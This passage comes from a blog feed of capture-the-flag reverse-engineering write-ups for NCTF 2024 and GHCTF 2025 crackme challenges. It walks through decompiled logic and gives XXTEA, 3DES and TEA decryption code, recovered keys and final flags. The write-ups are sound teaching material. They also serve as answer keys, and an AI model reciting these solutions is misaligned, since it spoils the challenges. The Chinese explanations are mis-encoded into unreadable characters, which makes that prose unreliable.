class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x48</span>, <span class="number">0x69</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0xDE</span>, <span class="number">0x81</span>, <span class="number">0xD8</span>, <span class="number">0xAD</span>, <span class="number">0xC2</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x32</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>,</span><br><span class="line">      <span class="number">0x61</span>, <span class="number">0x3E</span>, <span class="number">0xCB</span>, <span class="number">0xFF</span>, <span class="number">0xEF</span>, <span class="number">0xF1</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0x7A</span>, <span class="number">0x16</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xxtea_decrypt1</span>((<span class="type">uint32_t</span>*)enc1, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">xxtea_decrypt2</span>((<span class="type">uint32_t</span>*)enc2, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.20s%.20s\n&quot;</span>, enc1,enc2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;H4rd_VM_with_Gor0ut1n3_5fc4b0be7ad&#125;</code></p><h2 id="XLogin"><a href="#XLogin" class="headerlink" title="XLogin"></a>XLogin</h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>jadxåŠ è½½å‘ç°ä»£ç ä¸­è°ƒç”¨äº†Decstrå‡½æ•°æ¥è§£å¯†ä¸€äº›å­—ç¬¦ä¸²ï¼Œå¯ä»¥åœ¨libsimple.soé‡Œé¢æ‰¾åˆ°DecStrå‡½æ•°å®ç°ã€‚</p><p>å…·ä½“è§£å¯†å­—ç¬¦ä¸²å‡½æ•°å°±æ˜¯Base64æ¢è¡¨è§£å¯†åå†å¼‚æˆ–ä¸Šå½“å‰å­—ç¬¦ä¸²é•¿åº¦å€¼ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-24.png" alt="alt text"></p><p>å°±å¯ä»¥è§£å¯†å¾—åˆ°è¿™äº›å®é™…å­—ç¬¦ä¸²ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-25.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-26.png" alt="alt text"></p><p>å‘ç°doCheckæ˜¯åœ¨nativeé‡Œé¢ï¼Œidaåˆ†ælibnative.soï¼Œå‘ç°æœ‰ä¸ªloadDexï¼Œåº”è¯¥æ˜¯åŠ¨æ€åŠ è½½ä¸€ä¸ªdexã€‚</p><p><img src="/2025/03/24/NCTF2024/image-27.png" alt="alt text"></p><p>åœ¨loadDexä¸‹é¢å°±æ˜¯doCheckå‡½æ•°å®é™…å®ç°ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-28.png" alt="alt text"></p><p>é€šè¿‡ç‰¹å¾å¯ä»¥å‘ç°æ˜¯ä½¿ç”¨äº†3desåŠ å¯†ï¼Œå…ˆçŒœæµ‹ä»–æ²¡æœ‰é­”æ”¹ï¼Œæ¯•ç«Ÿé‚£ä¸€å¨ä»£ç æ²¡äººæƒ³çœ‹ã€‚ä¸Šé¢çš„ptrçš„ä¸¤ä¸ªæ•°æ®ï¼ˆxmmword_1804å’Œunk_1814å…±24å­—èŠ‚æ•°æ®ï¼‰å°±æ˜¯è¢«åŠ å¯†çš„flagï¼Œ3desåŠ å¯†åä¸‹é¢çš„whileå¾ªç¯å°±æ˜¯å¯¹åŠ å¯†åçš„æ•°æ®ä¸flagå¯†æ–‡è¿›è¡Œæ¯”å¯¹ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-29.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-30.png" alt="alt text"></p><p>åœ¨apkçš„Assetsé‡Œé¢ä¼šå‘ç°åˆæœ‰ä¸ªlibsimple.soï¼Œidaåˆ†ææ²¡æœ‰ä¸œè¥¿ï¼Œç›´æ¥æ‹–å…¥010å‘ç°å­˜åœ¨ä¸€ä¸ªdexç»“æ„å¤´ï¼Œå‰é¢çš„è¿™64å­—èŠ‚åº”è¯¥æ˜¯æ²¡ç”¨çš„ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-31.png" alt="alt text"></p><p>libnative.soé‡Œé¢loadDexè·Ÿåˆ°çš„å‡½æ•°éªŒè¯äº†è¿™ä¸ªçŒœæƒ³ï¼Œv13æ˜¯Assetsé‡Œçš„libsimple.soæ–‡ä»¶å¤§å°ï¼Œå‡å»äº†64ï¼Œç„¶åä¸‹é¢v17æ˜¯è¯»å–èµ·å§‹æŒ‡é’ˆï¼Œä¹ŸåŠ ä¸Šäº†64ï¼Œè¯´æ˜è¯»å–å®é™…æ–‡ä»¶è·³è¿‡äº†å‰64å­—èŠ‚ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-32.png" alt="alt text"></p><p>æŠŠå‰64å­—èŠ‚å»é™¤ï¼Œä½¿ç”¨jadxåˆ†æã€‚å‘ç°æ˜¯Checkå‡½æ•°ï¼Œæ£€æµ‹äº†usernameå’Œpasswordï¼Œå’Œé¢˜ç›®æè¿°flagæ ¼å¼å¯¹åº”ã€‚usernameè¿™è¾¹å¯ä»¥ç›´æ¥è§£å¯†å‡ºæ¥æ˜¯<code>X1c@dM1n1$t</code>ï¼Œç„¶åä½¿ç”¨usernameçš„MD5å€¼ä½œä¸ºå¯†é’¥å»è°ƒç”¨doCheckåŠ å¯†ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-33.png" alt="alt text"></p><p>å¯†é’¥ï¼š<code>7d53ecd36a43d3d237e7dd633dcf8497</code></p><p>ç„¶åæå–å¯†æ–‡è¿›è¡Œ3desè§£å¯†å³å¯ï¼Œç„¶åè¿™è¾¹æœ‰ä¸ªç«¯åºé—®é¢˜å¡äº†ä¸å°‘å¸ˆå‚…ä¸€æ®µæ—¶é—´ï¼Œå¯†æ–‡ä»¥åŠå¯†é’¥éƒ½è¦ä»¥8å­—èŠ‚ä½ä¸€ç»„è½¬æ¢åˆ°å¤§ç«¯åºï¼Œæ‰èƒ½è§£å¯†ï¼Œç„¶åè§£å¯†å®Œçš„æ˜æ–‡ä¹Ÿè¦ä»å¤§ç«¯åºè½¬å›åˆ°å°ç«¯åºã€‚</p><h3 id="è§£å¯†-3"><a href="#è§£å¯†-3" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><p><img src="/2025/03/24/NCTF2024/image-34.png" alt="alt text"></p><p>è§£å¯†å®Œå°†æ˜æ–‡ä»¥8å­—èŠ‚ä¸€ç»„å€’åºå¾—åˆ°æ˜æ–‡<code>SafePWD~5y$x?YM+5U05Gm6=</code></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;X1c@dM1n1$t_SafePWD~5y$x?YM+5U05Gm6=&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NCTF-2024-Reverse-WP&quot;&gt;&lt;a href=&quot;#NCTF-2024-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;NCTF 2024 Reverse WP&quot;&gt;&lt;/a&gt;NCTF 2024 Reverse WP&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GHCTF2025WP</title>
    <link href="https://tkazer.github.io/2025/03/06/GHCTF2025WP/"/>
    <id>https://tkazer.github.io/2025/03/06/GHCTF2025WP/</id>
    <published>2025-03-06T02:37:20.000Z</published>
    <updated>2025-03-24T11:15:54.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GHCTF-2025-Reverse-WP"><a href="#GHCTF-2025-Reverse-WP" class="headerlink" title="GHCTF 2025 Reverse WP"></a>GHCTF 2025 Reverse WP</h1><p>è¿™æ¬¡ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ç»™CTFæ¯”èµ›å‡ºé¢˜ï¼Œç»éªŒä¸è¶³ï¼Œå®Œå…¨æ˜¯å‡­å€Ÿä¹‹å‰æ‰“æ¯”èµ›åšçš„é¢˜çš„ç»éªŒæ¥å‡ºçš„ï¼Œéš¾åº¦å°½å¯èƒ½æŠŠæ§ä½æ¢¯åº¦ä¸Šå‡ï¼Œä½†æ˜¯å¯èƒ½è¿˜æ˜¯æ²¡åšçš„é‚£ä¹ˆå¥½ï¼Œå„ä½å¸ˆå‚…è§è°…äº†ï¼Œå¦‚æœæœ‰ä»€ä¹ˆå»ºè®®ä¹Ÿå¯ä»¥è”ç³»æˆ‘ã€‚</p><h2 id="ASN-Signin"><a href="#ASN-Signin" class="headerlink" title="ASN?Signin!"></a>ASN?Signin!</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é¢˜ä¼°è®¡å¤§ä¼™éƒ½AIä¸€æŠŠæ¢­äº†ï¼ˆï¼‰ï¼Œä¸è¿‡è¿˜æ˜¯è®²è®²asmä»£ç åˆ†ææµç¨‹ã€‚</p><p>asmä»£ç å¼€å¤´æ˜¯æ•°æ®æ®µï¼Œå­˜æ”¾ç€DATA1å’ŒDATA2ï¼Œè¿™ä¸¤æ®µå°±æ˜¯å…³é”®æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line">    WELCOME_MSG db &#x27;Welcome to GHCTF!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    INPUT_MSG db &#x27;Input your flag:&#x27;, &#x27;$&#x27;</span><br><span class="line"></span><br><span class="line">    WRONG_MSG db 0DH, 0AH, &#x27;Wrong!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    RIGHT_MSG db 0DH, 0AH, &#x27;Right!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    </span><br><span class="line">    DATA1 DB 26H,27H,24H,25H,2AH,2BH,28H,00H</span><br><span class="line">            DB 2EH,2FH,2CH,2DH,32H,33H,30H,00H</span><br><span class="line">            DB 36H,37H,34H,35H,3AH,3BH,38H,39H</span><br><span class="line">            DB 3EH,3FH,3CH,3DH,3FH,27H,34H,11H</span><br><span class="line">    </span><br><span class="line">    DATA2 DB 69H,77H,77H,66H,73H,72H,4FH,46H</span><br><span class="line">            DB 03H,47H,6FH,79H,07H,41H,13H,47H</span><br><span class="line">            DB 5EH,67H,5FH,09H,0FH,58H,63H,7DH</span><br><span class="line">            DB 5FH,77H,68H,35H,62H,0DH,0DH,50H</span><br><span class="line">    </span><br><span class="line">    BUFFER1 db 33 dup(0)</span><br><span class="line">    BUFFER2 db 33 dup(0)</span><br><span class="line">.CODE</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¿™éƒ¨åˆ†å°±æ˜¯ç¨‹åºå¯åŠ¨æ—¶æ‰§è¡Œä»£ç ï¼Œè¯»å…¥33å­—èŠ‚åˆ°BUFFER1ä¸­ï¼Œç„¶åCALL DO1å‡½æ•°ï¼Œå†CALL ENCå‡½æ•°ï¼Œæœ€åLOOP1è¿›è¡Œæ¯”å¯¹è·³è½¬åˆ°ç»“æœè¾“å‡ºã€‚æ‰€ä»¥å¯çŸ¥DATA2å°±æ˜¯åŠ å¯†åçš„Flagæ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">START:</span><br><span class="line">    MOV AX,@DATA</span><br><span class="line">    MOV DS,AX</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    MOV DX,OFFSET WELCOME_MSG</span><br><span class="line">    INT 21H</span><br><span class="line">    MOV DX,OFFSET INPUT_MSG</span><br><span class="line">    INT 21H</span><br><span class="line">    MOV AH,0AH</span><br><span class="line">    MOV DX,OFFSET BUFFER1</span><br><span class="line">    MOV BYTE PTR[BUFFER1],33    ; è¯»å…¥33å­—èŠ‚åˆ°BUFFER1</span><br><span class="line">    INT 21H</span><br><span class="line">    CALL DO1                    ; Call DO1</span><br><span class="line">    CALL ENC                    ; Call ENC</span><br><span class="line">    MOV SI,OFFSET BUFFER1 + 2</span><br><span class="line">    MOV DI,OFFSET DATA2</span><br><span class="line">    MOV CX,32</span><br><span class="line">LOOP1:                          ; æ¯”å¯¹DATA2å’ŒåŠ å¯†åçš„æ•°æ®</span><br><span class="line">    MOV AL,[SI]</span><br><span class="line">    CMP AL,[DI]</span><br><span class="line">    JNE P2</span><br><span class="line">    INC SI</span><br><span class="line">    INC DI</span><br><span class="line">    LOOP LOOP1</span><br><span class="line">P1:</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    LEA DX,RIGHT_MSG            ; è¾“å‡ºæ­£ç¡®ä¿¡æ¯</span><br><span class="line">    INT 21H</span><br><span class="line">    JMP EXIT_PROGRAM</span><br><span class="line">P2:</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    LEA DX,WRONG_MSG            ; è¾“å‡ºé”™è¯¯ä¿¡æ¯</span><br><span class="line">    INT 21H</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯DO1å‡½æ•°å’ŒDO2å‡½æ•°ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯é’ˆå¯¹DATA1è¿›è¡Œçš„ä¸€äº›æ“ä½œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">DO1 PROC</span><br><span class="line">    PUSH SI</span><br><span class="line">    PUSH DI</span><br><span class="line">    PUSH CX</span><br><span class="line">    XOR SI,SI</span><br><span class="line">    MOV CX,8</span><br><span class="line">SWAP_LOOP:</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV DI,SI</span><br><span class="line">    ADD DI,4</span><br><span class="line">    CMP DI,28</span><br><span class="line">    JL NOWRAP</span><br><span class="line">    SUB DI,28</span><br><span class="line">NOWRAP:</span><br><span class="line">    MOV BX,SI</span><br><span class="line">    CALL DO2</span><br><span class="line">    ADD SI,4</span><br><span class="line">    POP CX</span><br><span class="line">    LOOP SWAP_LOOP</span><br><span class="line">    POP CX</span><br><span class="line">    POP DI</span><br><span class="line">    POP SI</span><br><span class="line">    RET</span><br><span class="line">DO1 ENDP</span><br><span class="line"></span><br><span class="line">DO2 PROC</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV CX,4</span><br><span class="line">LOOP3:</span><br><span class="line">    MOV AL,DATA1[BX]</span><br><span class="line">    MOV AH,DATA1[DI]</span><br><span class="line">    MOV DATA1[BX],AH</span><br><span class="line">    MOV DATA1[DI],AL</span><br><span class="line">    INC BX</span><br><span class="line">    INC DI</span><br><span class="line">    LOOP LOOP3</span><br><span class="line">    POP CX</span><br><span class="line">    RET</span><br><span class="line">DO2 ENDP</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¿™éƒ¨åˆ†æ˜¯ENCå‡½æ•°ä»£ç ï¼Œæ˜¯åˆ©ç”¨DO1åçš„DATA1æ•°æ®ä¸è¾“å…¥çš„å­—ç¬¦è¿›è¡ŒXORæ“ä½œï¼Œæ³¨æ„åˆ°xoræ“ä½œéƒ½æ˜¯åœ¨WORDï¼Œä¹Ÿå°±æ˜¯äºŒå­—èŠ‚çš„åŸºç¡€ä¸Šè¿›è¡Œæ“ä½œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ENC PROC</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV SI,OFFSET BUFFER1 + 2</span><br><span class="line">    MOV DI,OFFSET DATA1</span><br><span class="line">    MOV CX,8</span><br><span class="line">LOOP2:</span><br><span class="line">    MOV AX,WORD PTR[DI + 1]</span><br><span class="line">    XOR WORD PTR[SI],AX             ; *(SHORT*)(Input + i) ^= *(SHORT*)(DATA1 + i + 1)</span><br><span class="line">    MOV AX,WORD PTR[DI + 2]</span><br><span class="line">    XOR WORD PTR[SI + 2],AX         ; *(SHORT*)(Input + i + 2) ^= *(SHORT*)(DATA1 + i + 2)</span><br><span class="line">    ADD SI,4</span><br><span class="line">    ADD DI,4</span><br><span class="line">    LOOP LOOP2</span><br><span class="line">    POP CX</span><br><span class="line">    RET</span><br><span class="line">ENC ENDP</span><br></pre></td></tr></table></figure><p>ç”±äºDO1å’ŒDO2åªæ˜¯å¯¹DATA1è¿™ä¸ªé™æ€æ•°æ®è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åŠ¨è°ƒæ‹¦æˆªåˆ°æ‰§è¡Œå®ŒDO1çš„DATA1æ•°æ®è¿›è¡Œå¯¹DATA2çš„è§£å¯†ã€‚è¿™é¢˜ASMä»£ç æ•…æ„ç»™å…¨çš„ï¼Œå°±æ˜¯ä¸ºäº†è®©é€‰æ‰‹å¯ä»¥ç›´æ¥ç¼–è¯‘åˆ°EXEå¹¶ä¸”ä½¿ç”¨DosBoxåŠ¨è°ƒï¼Œï¼ˆå¤§ä¼™å…¥é—¨8086æ±‡ç¼–åº”è¯¥éƒ½ç”¨è¿‡çš„å·¥å…·ï¼‰ã€‚</p><p>ç›´æ¥gå‘½ä»¤æ‰§è¡Œåˆ°DO1å‡½æ•°ï¼Œå¹¶ä¸”på‘½ä»¤æ­¥è¿‡ï¼Œ</p><p><img src="/2025/03/06/GHCTF2025WP/1.png" alt="alt text"></p><p>å†tå‘½ä»¤æ­¥å…¥ENCå‡½æ•°ï¼Œå†uå‘½ä»¤åæ±‡ç¼–å°±å¯ä»¥çœ‹åˆ°DATA1çš„åœ°å€ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/2.png" alt="alt text"></p><p>ç›´æ¥då‘½ä»¤å°±å¯ä»¥çœ‹åˆ°DATA1çš„æ•°æ®ï¼Œæå–å‡ºæ¥ä¸DATA2è¿›è¡Œè§£å¯†è®¡ç®—å³å¯å¾—åˆ°flagã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/3.png" alt="alt text"></p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> DATA1[] = &#123;</span><br><span class="line">        <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x3e</span>, <span class="number">0x27</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x37</span>,</span><br><span class="line">        <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3e</span>,</span><br><span class="line">        <span class="number">0x3f</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x28</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x2e</span>, <span class="number">0x2f</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> DATA2[] = &#123;</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x4F</span>,</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0x03</span>, <span class="number">0x47</span>, <span class="number">0x6F</span>, <span class="number">0x79</span>, <span class="number">0x07</span>, <span class="number">0x41</span>,</span><br><span class="line">        <span class="number">0x13</span>, <span class="number">0x47</span>, <span class="number">0x5E</span>, <span class="number">0x67</span>, <span class="number">0x5F</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>,</span><br><span class="line">        <span class="number">0x58</span>, <span class="number">0x63</span>, <span class="number">0x7D</span>, <span class="number">0x5F</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x35</span>,</span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint16_t</span> *)(DATA2 + i) ^= *(<span class="type">uint16_t</span> *)(DATA1 + i + <span class="number">1</span>);</span><br><span class="line">        *(<span class="type">uint16_t</span> *)(DATA2 + i + <span class="number">2</span>) ^= *(<span class="type">uint16_t</span> *)(DATA1 + i + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, DATA2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flagå€¼"><a href="#Flagå€¼" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;W0w_y0u&#39;re_g00d_@t_@5M!!&#125;</code></p><h2 id="LockedSecret"><a href="#LockedSecret" class="headerlink" title="LockedSecret"></a>LockedSecret</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é¢˜æœ¬æ¥æ˜¯å½“ä½œç¬¬ä¸€æ‰¹ç¬¬äºŒéš¾åº¦çš„é¢˜ï¼Œå®é™…é¢˜è§£è¿œä½äºFishingKitï¼ˆï¼‰ï¼Œæ²¡æƒ³åˆ°å±•å¼€Teaå¡ä½äº†ä¸å°‘äººäº†ã€‚</p><p>å‰é¢å¸¸è§„UPXå˜å¼‚è„±å£³å°±è·³è¿‡è®²è§£äº†ï¼Œä¸ä¼šçš„æ–°ç”Ÿå¯ä»¥å»çœ‹æ–‡ç« å†å­¦ä¹ å­¦ä¹ ã€‚<br>å°†è„±å®Œå£³çš„ç¨‹åºæ‹–å…¥IDAåˆ†æï¼Œå¯ä»¥çœ‹åˆ°ä¸»å‡½æ•°å†…å…±æœ‰ä¸¤ä¸ªå…³é”®å‡½æ•°è°ƒç”¨ï¼Œbyte_3F4060å°±æ˜¯åŠ å¯†åçš„Flagã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/4.png" alt="alt text"></p><p>ç¬¬ä¸€ä¸ªå‡½æ•°çš„åˆ©ç”¨ä¼ªéšæœºå¯¹ä¸€ä¸ªå…¨å±€æ•°ç»„è¿›è¡Œåˆå§‹åŒ–èµ‹å€¼ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/5.png" alt="alt text"></p><p>ç¬¬äºŒä¸ªå‡½æ•°å°±æ˜¯åŠ å¯†å‡½æ•°ï¼Œå°†ä¸€ä¸²æ˜æ–‡keyä¸ä¸Šä¸€ä¸ªå‡½æ•°åˆå§‹åŒ–çš„å€¼è¿›è¡Œå¼‚æˆ–è®¡ç®—å¾—åˆ°ç”¨äºåŠ å¯†çš„Keyã€‚åº•ä¸‹åŠ å¯†éƒ¨åˆ†ä»£ç ç”±äºIDAçš„ååç¼–è¯‘å™¨é—®é¢˜ï¼Œå¯¼è‡´æœ‰ç‚¹ä¸‘é™‹ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥çœ‹å‡ºTeaåŠ å¯†çš„ç‰¹å¾ï¼Œåªä¸è¿‡å’Œå¸¸è§„Teaç›¸æ¯”ä¼¼ä¹å°‘äº†å¾ªç¯ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/6.png" alt="alt text"></p><p>æ¢åˆ°Ghidraåˆ†æå¾—åˆ°çš„ä¼ªä»£ç ä¼šæ›´ç®€æ´ï¼Œå¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹å‡ºå°±æ˜¯TeaåŠ å¯†ï¼Œä¸è¿‡ç”¨é‡å¤è®¡ç®—å’Œä¸åŒçš„sumå€¼æ¥ä»£æ›¿äº†å¾ªç¯åŠ å¯†ã€‚</p><p>å°†ç¬¬äºŒæ¬¡è®¡ç®—çš„bc46effeå‡å»5e2377ffä¼šå‘ç°ç»“æœè¿˜æ˜¯5e2377ffï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“5e2377ffå°±æ˜¯deltaå€¼ï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä»deltaå€¼å¼€å§‹çš„TeaåŠ å¯†ã€‚</p><p>å¹¶ä¸”ä¸¤ä¸¤è®¡ç®—ä¸ºä¸€ç»„ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯8è½®åŠ å¯†çš„Teaï¼Œå¹¶ä¸”æœ€åå°†åŠ å¯†å®Œçš„å€¼å†å¼‚æˆ–ä¸Šäº†0xfã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/7.png" alt="alt text"></p><p>ç›´æ¥æ–­ç‚¹è¯¥å¤„è·å¾—Keyï¼Œè¿›è¡Œ8è½®çš„Teaè§£å¯†å³å¯å¾—åˆ°Flagã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/8.png" alt="alt text"></p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 